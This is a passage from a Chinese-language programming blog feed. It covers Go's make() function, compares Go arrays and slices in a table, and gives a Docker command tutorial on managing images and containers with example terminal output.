&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;s3 = &lt;span style=&#34;color:#007020&#34;&gt;append&lt;/span&gt;((&lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;s3), &lt;span style=&#34;color:#40a070&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fmt.&lt;span style=&#34;color:#06287e&#34;&gt;Println&lt;/span&gt;(s3)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;输出如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;amp;[0 1]
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;make的使用说明&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#make%e7%9a%84%e4%bd%bf%e7%94%a8%e8%af%b4%e6%98%8e&#34;&gt;
        ##
    &lt;/a&gt;
    make()的使用说明
&lt;/div&gt;
&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;类型&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;th&gt;参数解释&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;slice&lt;/td&gt;
&lt;td&gt;创建一个指定长度的slice&lt;/td&gt;
&lt;td&gt;第一个参数(t)：所要创建的类型，例如[]int&lt;/br&gt;第二个参数(size)：指定slice的长度&lt;/br&gt;第三个参数（可选）：如果指定了这个参数，那么它说明了要创建的slice的容量(capacity)，并且这个参数必须大于等于size&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;map&lt;/td&gt;
&lt;td&gt;创建一个空的map，并且为map预留足够的空间可以存放size个元素&lt;/td&gt;
&lt;td&gt;第一个参数（t）：指定要创建的类型，此处为map&lt;/br&gt;第二个参数（size）：指定map大小，让make预留出至少size个元素所需要的空间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;channel&lt;/td&gt;
&lt;td&gt;创建一个channel，并为这个channel初始化一个长度为size的buffer&lt;/td&gt;
&lt;td&gt;第一个参数：指定channel类型，例如chan string&lt;/br&gt;第二个参数（size）：指定缓冲区的大小&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;
&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;6
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;7
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;var&lt;/span&gt; slice1 []&lt;span style=&#34;color:#902000&#34;&gt;int&lt;/span&gt; = &lt;span style=&#34;color:#007020&#34;&gt;make&lt;/span&gt;([]&lt;span style=&#34;color:#902000&#34;&gt;int&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;20&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;var&lt;/span&gt; slice2 = &lt;span style=&#34;color:#007020&#34;&gt;make&lt;/span&gt;([]&lt;span style=&#34;color:#902000&#34;&gt;int&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;20&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;var&lt;/span&gt; map1 &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;map&lt;/span&gt;[&lt;span style=&#34;color:#902000&#34;&gt;int&lt;/span&gt;]&lt;span style=&#34;color:#902000&#34;&gt;string&lt;/span&gt; = &lt;span style=&#34;color:#007020&#34;&gt;make&lt;/span&gt;(&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;map&lt;/span&gt;[&lt;span style=&#34;color:#902000&#34;&gt;int&lt;/span&gt;]&lt;span style=&#34;color:#902000&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;10&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;var&lt;/span&gt; map2 = &lt;span style=&#34;color:#007020&#34;&gt;make&lt;/span&gt;(&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;map&lt;/span&gt;[&lt;span style=&#34;color:#902000&#34;&gt;int&lt;/span&gt;]&lt;span style=&#34;color:#902000&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;10&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;var&lt;/span&gt; chan1 &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;chan&lt;/span&gt; &lt;span style=&#34;color:#902000&#34;&gt;string&lt;/span&gt; = &lt;span style=&#34;color:#007020&#34;&gt;make&lt;/span&gt;(&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;chan&lt;/span&gt; &lt;span style=&#34;color:#902000&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;1024&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;var&lt;/span&gt; chan2 = &lt;span style=&#34;color:#007020&#34;&gt;make&lt;/span&gt;(&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;chan&lt;/span&gt; &lt;span style=&#34;color:#902000&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>GO语言中array与slice的比较</title>
      <link>/2017/11/go%E8%AF%AD%E8%A8%80%E4%B8%ADarray%E4%B8%8Eslice%E7%9A%84%E6%AF%94%E8%BE%83/</link>
      <pubDate>Tue, 07 Nov 2017 14:25:00 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/11/go%E8%AF%AD%E8%A8%80%E4%B8%ADarray%E4%B8%8Eslice%E7%9A%84%E6%AF%94%E8%BE%83/</guid>
      <description>&lt;!-- more /--&gt;
&lt;p&gt;go语言中array与slice的区别总结&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;数组array&lt;/th&gt;
&lt;th&gt;切片slice&lt;/th&gt;
&lt;th&gt;区别&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;声明定义&lt;/td&gt;
&lt;td&gt;&lt;div&gt;var arrayName [arrayLength] dataType&lt;/div&gt;&lt;/td&gt;
&lt;td&gt;var sliceName [] dataType&lt;/td&gt;
&lt;td&gt;声明数组需要长度信息，定义slice时不需要&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;初始化&lt;/td&gt;
&lt;td&gt;var arrayName = [arrayLength] dataType {Val1, &amp;hellip; Valn} &lt;/br&gt;&lt;/br&gt;var arrayName = [&amp;hellip;] dataType {Val1, &amp;hellip; Valn}&lt;/td&gt;
&lt;td&gt;var sliceName = [] dataType {Val1, &amp;hellip; Valn}&lt;/br&gt;&lt;/br&gt;var slice [] type = make([] type, length)&lt;/br&gt;&lt;/br&gt;通过数组初始化：&lt;/br&gt;slice := array[:]&lt;/br&gt;slice := array[startIndex:endIndex]&lt;/td&gt;
&lt;td&gt;初始化数组时需要长度信息，初始化slice时不需要&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;取值&lt;/td&gt;
&lt;td&gt;通过索引index取相应的元素值:&lt;/br&gt;arrayName[index]&lt;/td&gt;
&lt;td&gt;通过index取元素值：&lt;/br&gt;slice[index] &lt;/br&gt;&lt;/br&gt;返回一个新切片值:&lt;/br&gt; slice[startIndex:endIndex]&lt;/td&gt;
&lt;td&gt;slice取值除了可以获取一个元素的值外，还可以获取一个新的切片&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;赋值&lt;/td&gt;
&lt;td&gt;元素赋值：&lt;/br&gt;array[index] = value &lt;/br&gt;&lt;/br&gt; 数组赋值：&lt;/br&gt; var new_array = array &lt;/br&gt; new_array := array&lt;/td&gt;
&lt;td&gt;元素赋值：&lt;/br&gt; slice[index] = value &lt;/br&gt;&lt;/br&gt;将单个单个值append()到slice中，返回的新slice长度会增加:&lt;/br&gt;slice = append(slice, v1, v2&amp;hellip;) &lt;/br&gt;&lt;/br&gt;将一个slice copy()到另一个slice中，目标slice长度不变，最多copy截止到目标元素最后一个元素：&lt;/br&gt; copy(slice1, slice2) &lt;/br&gt; copy(slice1[si:], slice2)&lt;/td&gt;
&lt;td&gt;数组支持简单的单元素或者整体赋值，slice则支持更加精细度的赋值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;扩展&lt;/td&gt;
&lt;td&gt;不支持&lt;/td&gt;
&lt;td&gt;append()，新的slice length和capacity均发生变化：&lt;/br&gt;&lt;/br&gt; var slice = []int {1, 2, 3, 4, 5}&lt;/br&gt;slice = append(slice, 1, 2)&lt;/br&gt;fmt.Printf(&amp;ldquo;length: %d, capacity: %d\n&amp;rdquo;, len(slice), cap(slice)) &lt;/br&gt;&lt;/br&gt; length: 7, capacity: 10&lt;/td&gt;
&lt;td&gt;slice支持扩展，扩展后的新slice长度为新元素的个数，capacity是原capacity的2的指数倍&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;函数传参&lt;/td&gt;
&lt;td&gt;值传递，被传递的array所有的值copy給形式参数，函数内对数组的改变不会传播给传入的数组&lt;/td&gt;
&lt;td&gt;引用传递，函数内对slice的改变会反应到传入的参数中&lt;/td&gt;
&lt;td&gt;数组是值传递，所以直接传递数组代价很高，使用slice相应代价会降低。因此go的标准库中多以slice实现&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;判断长度&lt;/td&gt;
&lt;td&gt;len()&lt;/td&gt;
&lt;td&gt;len()&lt;/td&gt;
&lt;td&gt;相同&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
</description>
    </item>
    
    <item>
      <title>Docker</title>
      <link>/2017/10/docker/</link>
      <pubDate>Tue, 31 Oct 2017 23:59:00 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/10/docker/</guid>
      <description>&lt;!-- more /--&gt;
&lt;h1 id=&#34;1-配置docker-repository&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#1-%e9%85%8d%e7%bd%aedocker-repository&#34;&gt;
        ##
    &lt;/a&gt;
    1. 配置docker repository
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2017/10/docker/preference-repository.png&#34; alt=&#34;preference&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-docker-image&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#2-docker-image&#34;&gt;
        ##
    &lt;/a&gt;
    2. Docker image
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;image（镜像）保存docker中的可运行系统的数据，当运行时docker把image加载到container（容器）中运行。&lt;/p&gt;
&lt;h2 id=&#34;21-获取docker-image&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#21-%e8%8e%b7%e5%8f%96docker-image&#34;&gt;
        #
    &lt;/a&gt;
    2.1 获取docker image
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;命令： docker pull
&lt;ul&gt;
&lt;li&gt;Docker Registry: 地址的格式一般是 &amp;lt;域名/IP&amp;gt; :端口号 ，默认是docker hub。&lt;/li&gt;
&lt;li&gt;仓库名：格式&amp;lt;用户名&amp;gt;/&amp;lt;软件名&amp;gt;，默认是Docker hub的&amp;quot;Library&amp;quot;。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;
docker pull [选项] [Docker Registry地址]&lt;仓库名&gt;:&lt;标签&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;22-查询image&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#22-%e6%9f%a5%e8%af%a2image&#34;&gt;
        #
    &lt;/a&gt;
    2.2 查询image
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;命令：docker images&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;
$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              14.04               dea1945146b9        6 weeks ago         188MB
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;23-删除镜像&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#23-%e5%88%a0%e9%99%a4%e9%95%9c%e5%83%8f&#34;&gt;
        #
    &lt;/a&gt;
    2.3 删除镜像
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;命令： docker rmi&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
# 先查询镜像列表
$ docker images
REPOSITORY                        TAG                 IMAGE ID            CREATED             SIZE
ubuntu-mydev                      latest              0cbd01981d7e        7 weeks ago         761MB
hyperledger/composer-playground   0.15.0              10c6824e69dd        8 weeks ago         251MB
hyperledger/composer-playground   latest              10c6824e69dd        8 weeks ago         251MB
ubuntu                            latest              dd6f76d9cc90        2 months ago        122MB

# 使用rmi删除镜像
$ docker rmi dea1945146b9
Untagged: ubuntu:14.04
Untagged: ubuntu@sha256:6e3e3f3c5c36a91ba17ea002f63e5607ed6a8c8e5fbbddb31ad3e15638b51ebc
Deleted: sha256:dea1945146b96542e6e20642830c78df702d524a113605a906397db1db022703
Deleted: sha256:6401e3024b4d4ef4c981cde2e830858eb790ee84284e1401cf569a6db8df51d9
Deleted: sha256:f12ee38eb7aa0ffdd43c657b433d91ac4c2930887c02eb638fd1518f374bc738
Deleted: sha256:9ac64e2751425199591402799079940629829c7c2fc0e083fb714e5dd94d70a9
Deleted: sha256:12a6279e654d2f23c2fa086bf2dcd82e1a2c82b01028379bbf2cde061d9235e6
Deleted: sha256:c47d9b229ca4eaf5d3b85b6fa7f794d00910a42634dd0fd5107a9a937b13b20f 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但有时候会发现无法删除，原因可能是因为这个镜像可能被某个容器使用，即使是这个容器处于停止的状态也无法删除，这种时候可以先查询所有的容器信息，然后删除对应的容器再删除镜像，例如下面的例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
$ docker images
REPOSITORY                        TAG                 IMAGE ID            CREATED             SIZE
ubuntu-mydev                      latest              0cbd01981d7e        7 weeks ago         761MB
hyperledger/composer-playground   0.15.0              10c6824e69dd        8 weeks ago         251MB
ubuntu                            latest              dd6f76d9cc90        2 months ago        122MB
hyperledger/fabric-ca             x86_64-1.0.4        8e691b3509bf        2 months ago        238MB
hyperledger/fabric-couchdb        x86_64-1.0.4        cf24b91dfeb1        2 months ago        1.5GB
hyperledger/fabric-orderer        x86_64-1.0.4        b17741e7b036        2 months ago        151MB
hyperledger/fabric-peer           x86_64-1.0.4        1ce935adc397        2 months ago        154MB
hyperledger/fabric-ccenv          x86_64-1.0.4        856061b1fed7        2 months ago        1.28GB

# 想删除&#39;hyperledger/composer-playground&#39;/1ce935adc397这个镜像
$ docker rmi 1ce935adc397
Error response from daemon: conflict: unable to delete 1ce935adc397 (must be forced) - image is being used by stopped container ebf84b524cd1

# 使用ps -a查询所有的容器发现这个镜像正在被使用
$ docker ps -a
CONTAINER ID        IMAGE                                     COMMAND                  CREATED             STATUS                     PORTS                                            NAMES
5f023623d725        10c6824e69dd                              &#34;pm2-docker compos...&#34;   7 weeks ago         Exited (255) 7 weeks ago   0.0.0.0:8080-&gt;8080/tcp                           composer
ebf84b524cd1        hyperledger/fabric-peer:x86_64-1.0.4      &#34;peer node start -...&#34;   7 weeks ago         Exited (255) 7 weeks ago   0.0.0.0:7051-&gt;7051/tcp, 0.0.0.0:7053-&gt;7053/tcp   peer0.org1.example.com
8c1ec47087ed        hyperledger/fabric-ca:x86_64-1.0.4        &#34;sh -c &#39;fabric-ca-...&#34;   7 weeks ago         Exited (255) 7 weeks ago   0.0.0.0:7054-&gt;7054/tcp                           ca.org1.example.com
626a1425e63b        hyperledger/fabric-orderer:x86_64-1.0.4   &#34;orderer&#34;                7 weeks ago         Exited (255) 7 weeks ago   0.0.0.0:7050-&gt;7050/tcp                           orderer.example.com
88d33e9fb79b        hyperledger/fabric-couchdb:x86_64-1.0.4   &#34;tini -- /docker-e...&#34;   7 weeks ago         Exited (255) 7 weeks ago   4369/tcp, 9100/tcp, 0.0.0.0:5984-&gt;5984/tcp       couchdb

# 先删除容器
$ docker rm 5f023623d725
5f023623d725

# 删除使用的容器后就可以成功删除镜像了
$ docker rmi 10c6824e69dd
Untagged: hyperledger/composer-playground:0.15.0
Untagged: hyperledger/composer-playground@sha256:99e9085d3ba41756346c2cbd1b742ee47e3711ef80beffd7c3f213b12d0ab742
Deleted: sha256:10c6824e69dda798c9e410022f98e611588d6329d971dd3dd820222b8f7bc262
Deleted: sha256:c1a2d861f0a7ceb3522aae14766378f43ecce9f2fc7cf8378c717c87706c9858
Deleted: sha256:a0cd8928aca4f0f2bb928c87708b8567cb24943ebc90087d11e731d18e057fe7
Deleted: sha256:739201d02a774f402f04caed742be27d05b662df6dacb7cb3443230ebcfc8533
Deleted: sha256:18b9f03395a2502b91191724608944527109d92cde1835dc4bfc566a441d9d80
Deleted: sha256:5c95c8934a297dd3bc9e748edad7f00040c7be218f81b7e0488712c30829d407
Deleted: sha256:2aebd096e0e237b447781353379722157e6c2d434b9ec5a0d63f2a6f07cf90c2
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;3-container容器&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#3-container%e5%ae%b9%e5%99%a8&#34;&gt;
        ##
    &lt;/a&gt;
    3. Container（容器）
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;首先了解一下容器的生命周期：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://7xpbnt.com1.z0.glb.clouddn.com/docker-architecture-v12-15-638.jpg&#34; alt=&#34;container life-cycle&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;31-创建一个容器&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#31-%e5%88%9b%e5%bb%ba%e4%b8%80%e4%b8%aa%e5%ae%b9%e5%99%a8&#34;&gt;
        #
    &lt;/a&gt;
    3.1 创建一个容器
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;create命令用来创建一个容器，但不运行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
docker create [OPTIONS] IMAGE [COMMAND] [ARG...]
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;32-直接启动一个conainer容器并运行指定的image镜像&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#32-%e7%9b%b4%e6%8e%a5%e5%90%af%e5%8a%a8%e4%b8%80%e4%b8%aaconainer%e5%ae%b9%e5%99%a8%e5%b9%b6%e8%bf%90%e8%a1%8c%e6%8c%87%e5%ae%9a%e7%9a%84image%e9%95%9c%e5%83%8f&#34;&gt;
        #
    &lt;/a&gt;
    3.2 直接启动一个Conainer(容器)并运行指定的image(镜像)
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;命令：docker run&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker run &amp;lt;仓库名&amp;gt;:&amp;lt;标签&amp;gt;
或 docker run &amp;lt;Image ID&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
$ docker run -it --rm dea1945146b9 bash
root@dc13a33ffc94:/#
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;-d：后台运行&lt;/li&gt;
&lt;li&gt;-p：指定端口：
&lt;ul&gt;
&lt;li&gt;-p port：把容器的port端口发布到host的随机端口&lt;/li&gt;
&lt;li&gt;-p host_port:port：把容器的port发布到host的host_port端口&lt;/li&gt;
&lt;li&gt;-p host_ip:host_port:port：把容器的port端口发布到主机的host_ip:host_port上&lt;/li&gt;
&lt;li&gt;-P：发布容器的所有端口到主机的随机端口上&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-it：这是两个参数，一个是 -i：交互式操作，一个是 -t 终端。我们这里打算进入 bash 执行一些命令并查看返回结果，因此我们需要交互式终端。&lt;/li&gt;
&lt;li&gt;-v：指定卷
&lt;ul&gt;
&lt;li&gt;-v volume_path：启动容器并指定volume_path为卷&lt;/li&gt;
&lt;li&gt;-v host_path:volume_path：启动容器并将volume_path映射到host的host_path上&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;volume-from：从别的容器中加载卷&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;
# 启动容器db
$ docker run -v /var/lib/postgresql/data --name mydb postgres
# 启动backup容器，从mydb容器中挂载卷
$ docker run --volumes-from mydb backup
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&amp;ndash;rm：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 docker rm。我们这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 &amp;ndash;rm 可以避免浪费空间。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;前台(Foreground)/后台(Detached)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;默认情况下容器再前台运行，如果需要后台运行可以指定&amp;rsquo;-d&amp;rsquo;参数，这时容器不再使用&amp;rsquo;docker run&amp;rsquo;这个终端作为I/O界面，只能通过网络或共享卷与这个容器通讯。&lt;/p&gt;
&lt;p&gt;如果一个容器处于后台状态可以用&amp;rsquo;attach&amp;rsquo;命令重新恢复前台状态。&lt;/p&gt;
&lt;h2 id=&#34;33-在运行的容器内执行命令&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#33-%e5%9c%a8%e8%bf%90%e8%a1%8c%e7%9a%84%e5%ae%b9%e5%99%a8%e5%86%85%e6%89%a7%e8%a1%8c%e5%91%bd%e4%bb%a4&#34;&gt;
        #
    &lt;/a&gt;
    3.3 在运行的容器内执行命令
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;命令：docker exec&lt;/p&gt;
&lt;p&gt;例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
docker exec -it webserver bash
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;33-查询容器&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#33-%e6%9f%a5%e8%af%a2%e5%ae%b9%e5%99%a8&#34;&gt;
        #
    &lt;/a&gt;
    3.3 查询容器
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;一个运行状态的容器可以使用docker ps进行查询，但如果一个容器处于停止状态时则需要通过docker ps -a来进行查询了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
# 查询运行状态的容器
$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES

# 查询所有包括停止的容器
$ docker ps -a
CONTAINER ID        IMAGE                                     COMMAND                  CREATED             STATUS                     PORTS                                            NAMES
ebf84b524cd1        hyperledger/fabric-peer:x86_64-1.0.4      &#34;peer node start -...&#34;   7 weeks ago         Exited (255) 7 weeks ago   0.0.0.0:7051-&gt;7051/tcp, 0.0.0.0:7053-&gt;7053/tcp   peer0.org1.example.com
8c1ec47087ed        hyperledger/fabric-ca:x86_64-1.0.4        &#34;sh -c &#39;fabric-ca-...&#34;   7 weeks ago         Exited (255) 7 weeks ago   0.0.0.0:7054-&gt;7054/tcp                           ca.org1.example.com
626a1425e63b        hyperledger/fabric-orderer:x86_64-1.0.4   &#34;orderer&#34;                7 weeks ago         Exited (255) 7 weeks ago   0.0.0.0:7050-&gt;7050/tcp                           orderer.example.com
88d33e9fb79b        hyperledger/fabric-couchdb:x86_64-1.0.4   &#34;tini -- /docker-e...&#34;   7 weeks ago         Exited (255) 7 weeks ago   4369/tcp, 9100/tcp, 0.0.0.0:5984-&gt;5984/tcp       couchdb
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;34-停止运行一个容器&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#34-%e5%81%9c%e6%ad%a2%e8%bf%90%e8%a1%8c%e4%b8%80%e4%b8%aa%e5%ae%b9%e5%99%a8&#34;&gt;
        #
    &lt;/a&gt;
    3.4 停止/运行一个容器
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;
# 启动一个或多个停止的容器
docker start [OPTIONS] CONTAINER [CONTAINER...]

# 停止一个或多个运行的容器
docker stop [OPTIONS] CONTAINER [CONTAINER...]
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;35-暂停继续运行一个容器&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#35-%e6%9a%82%e5%81%9c%e7%bb%a7%e7%bb%ad%e8%bf%90%e8%a1%8c%e4%b8%80%e4%b8%aa%e5%ae%b9%e5%99%a8&#34;&gt;
        #
    &lt;/a&gt;
    3.5 暂停/继续运行一个容器
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;
# 暂停一个或多个容器
docker pause CONTAINER [CONTAINER...]

# 继续运行一个或多个容器
docker unpause CONTAINER [CONTAINER...]
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;36-重启一个容器&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#36-%e9%87%8d%e5%90%af%e4%b8%80%e4%b8%aa%e5%ae%b9%e5%99%a8&#34;&gt;
        #
    &lt;/a&gt;
    3.6 重启一个容器
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;
docker restart [OPTIONS] CONTAINER [CONTAINER...]

# 可以指定参数&#39;-t&#39;
-t, --time int   Seconds to wait for stop before killing the container (default 10)
